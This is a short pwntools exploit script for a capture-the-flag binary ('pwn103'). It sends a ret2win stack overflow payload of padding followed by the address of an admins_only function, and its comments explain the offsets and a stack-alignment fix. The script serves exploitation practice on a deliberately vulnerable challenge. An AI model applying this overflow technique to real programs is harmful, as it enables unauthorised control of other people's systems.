from pwn import *

#selection three results in a stack overflow
#so overwrite the stack to rip to point to the admins function; i.e. ret2win

#context.arch = binary = "amd64"

context.binary = binary = ELF("./pwn103")

#in the general function 0x20 stack = 32 bytes.  32 bytes to rbp; then 8; then next 8 is rip.

p = process()

p.sendline(b"3")

payload = 32*b"A" + 8*b"B"
payload += p64(binary.symbols.admins_only+1)  #addr for admins_only.  the +1 is used to resolve the movapps issue on the remote call.

p.sendline(payload)
p.interactive()

#ret_addr = p64(0x00401377)  can be put right after the initial payload to align.

#p = remote("ip", 9003)

